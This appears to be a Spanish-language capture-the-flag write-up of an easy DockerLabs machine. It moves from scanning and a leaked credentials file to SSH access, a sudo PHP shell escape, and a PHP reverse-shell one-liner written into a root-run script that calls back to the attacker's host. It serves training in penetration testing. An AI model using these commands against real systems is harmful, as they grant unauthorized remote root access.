Propiedades:
- OS: Linux
- Plataforma: DockerLabs
- Nivel: Easy
- Tags: #credential-leak #ssh #dockerlabs
 
![](../assets/Pasted image 20251108153451.png)

## Reconocimiento

Empezamos tirando un ping para comprobar conectividad
```bash
> ping -c 1 172.17.0.2
------------------------------------------------------------
-- 172.17.0.2 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.315/0.315/0.315/0.000 ms
```

Ahora procedo a tirar un escaneo con nmap para ver que puertos están abierto
```bash
> sudo nmap -p- --open -sS -Pn -n --min-rate 5000 172.17.0.2
-----------------------------------------------------------------
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 02:30:D5:BE:7C:49 (Unknown)
```
- Puerto 80 HTTP y 22 SSH abiertos

Tiro un segundo escaneo para ver que servicios, y versiones corren en los puertos abiertos
```bash
sudo nmap -p 22,80 -sS -sCV --min-rate 5000 -Pn -n 172.17.0.2 -oN target.txt
--------------------------------------------------------------------------------
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 fb:64:7a:a5:1f:d3:f2:73:9c:8d:54:8b:65:67:3b:11 (RSA)
|   256 47:e1:c1:f2:de:f5:80:0e:10:96:04:95:c2:80:8b:76 (ECDSA)
|_  256 b1:c6:a8:5e:40:e0:ef:92:b2:e8:6f:f3:ad:9e:41:5a (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Mi Landing Page - Ciberseguridad
|_http-server-header: Apache/2.4.41 (Ubuntu)
MAC Address: 02:30:D5:BE:7C:49 (Unknown)
```
- Los servicios que están corriendo son: 
	- 80 HTTP Apache httpd 2.4.41 ((Ubuntu))
	- 22 SSH OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)




### Enumeración

**Puerto 80**

- Es una pagina web de un perrito que esta cabron.
![](../assets/Pasted image 20251108154912.png)

En su codigo fuente lo mas relevante son los _script.js_
![](../assets/Pasted image 20251108165633.png)


Procedí a realizar fuzzing para ver que mas podía encontrar
```bash
> gobuster dir -w raft-large-directories.txt -u http://172.17.0.2/ -x html,php,js,txt,py
------------------------------------------------------------------------------------------
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/script.js            (Status: 200) [Size: 2822]
/index.html           (Status: 200) [Size: 9487]
/imagenes.js          (Status: 200) [Size: 398]
/server-status        (Status: 403) [Size: 275]
/whoami               (Status: 301) [Size: 309] [--> http://172.17.0.2/whoami/]
/index.html           (Status: 200) [Size: 9487]
```
- _script.js_ y _whoami_ es lo que mas me llama la atención

## Explotación

Le di una leída al _script.js_ y encontré esta parte de codigo:

```js
  // Funcionalidad para ocultar/mostrar el header al hacer scroll y el secretito de la web
    console.log("Se ha prohibido el acceso al archivo .env, que es donde se guarda la password de backup, pero hay una copia llamada .env_de_baluchingon visible jiji")
    let lastScrollTop = 0;
    const header = document.querySelector('header');
    const delta = 5; // La cantidad mÃ­nima de scroll para ocultar el header
```
- Al parecer existe un archivo llamado .env_de_baluchingon visible que supongo serán credenciales para el ssh.

Lo segundo que me llamo la atención fue el directorio _whoami_
- Al parecer no tenia nada interesante
![](../assets/Pasted image 20251108160610.png)

Ahora, sabiendo que existe un archivo visible llamado `.env_de_baluchingon` mi idea era tratar de listarlo en todos los directorios para ver si alguno me lo volcaba. Entonces procedi a listarlo desde la raíz para ver si tenia suerte.
```bash
http://172.17.0.2/.env_de_baluchingon
```

Y al parecer tuve suerte a la primera
![](../assets/Pasted image 20251108160744.png)

Procedo a conectarme mediante `SSH` con las credenciales lekeadas. 

```bash
> ssh balu@172.17.0.2
```


## Escalada de Privilegios

Dentro del ssh lo primero que hago es listar directorios y listar posibles binarios que pueda usar para migrar a otros usuarios 
```bash
balu@6cde27e6f35a:~$ ls
balu@6cde27e6f35a:~$ sudo -l
---------------------------------------------------------
User balu may run the following commands on 6cde27e6f35a:
    (chocolate) NOPASSWD: /usr/bin/php
```
- Aquí vemos que existe un binario _php_ que puede ser ejecutado por el usuario chocolate

Por lo cual procedemos a explotar el binario con ayuda de GTFObins
```bash
> balu@6cde27e6f35a:~$ sudo -u chocolate /usr/bin/php -r 'system("/bin/bash");'
chocolate@6cde27e6f35a:/home/balu$ whoami
chocolate
```

Ahora, siendo el usuario chocolate volvimos a listar por binarios pero nos pedía la contraseña de chocolate, la cual no tenemos.
```bash
> sudo -l
Password for chocolate: 
```

Entonces procedimos a movernos entre directorios hasta que dimos con el directorio /opt
```
> chocolate@6cde27e6f35a:/opt$
```

Aquí fue donde nos encontramos con un archivo llamado `script.php` que podia ser modificado por nuestro usuario chocolate.

```bash
> chocolate@6cde27e6f35a:/opt$ ls -la
---------------------------------------------------------
-rw-r--r-- 1 chocolate chocolate 59 May  7  2024 script.php
```

Inspeccionamos el script para ver que hace: 
- No hace nada interesante
```php
> chocolate@6cde27e6f35a:/opt$ cat script.php
<?php echo 'Script de pruebas en fase de beta testing'; ?>
```

Ahora nuestro segundo approach fue listar los proceso que el usuario root estuviera ejecutando y nos encontramos algo interesante
```bash
chocolate@6cde27e6f35a:/opt$ ps aux | grep root
--------------------------------------------------
root   1  0.0  0.0   2616  1428 ? Ss 21:33 0:00 /bin/sh -c service apache2 start && a2ensite 000-default.conf && service ssh start && while true; do php /opt/script.php; sleep 5; done
```
- El usuario root esta ejecutando un bucle infinito que a su vez ejecuta el archivo _script.php_

Sabiendo esto, básicamente podemos modificar el archivo _script.php_ para mandarnos una reverse shell, gracias a que el usuario root eventualmente va a ejecutar este script.

Primero nos ponemos en escucha:
```bash
> sudo nc -nlvp 443
```

Después remplazamos el contenido del script.php
- Reverse Shell
```bash
chocolate@6cde27e6f35a:/opt$ echo '<?php $sock=fsockopen("172.17.0.1",443);exec("/bin/sh -i <&3 >&3 2>&3"); ?>' > /opt/script.php
chocolate@6cde27e6f35a:/opt$ cat script.php
<?php $sock=fsockopen("172.17.0.1",443);exec("/bin/sh -i <&3 >&3 2>&3"); ?>
```

El usuario root ejecuta el script y nos llega la shell
```bash
Connection received on 172.17.0.2 48862
/bin/sh: 0: can't access tty; job control turned off
# whoami
root
# id
uid=0(root) gid=0(root) groups=0(root)
# 
```


***PWNED**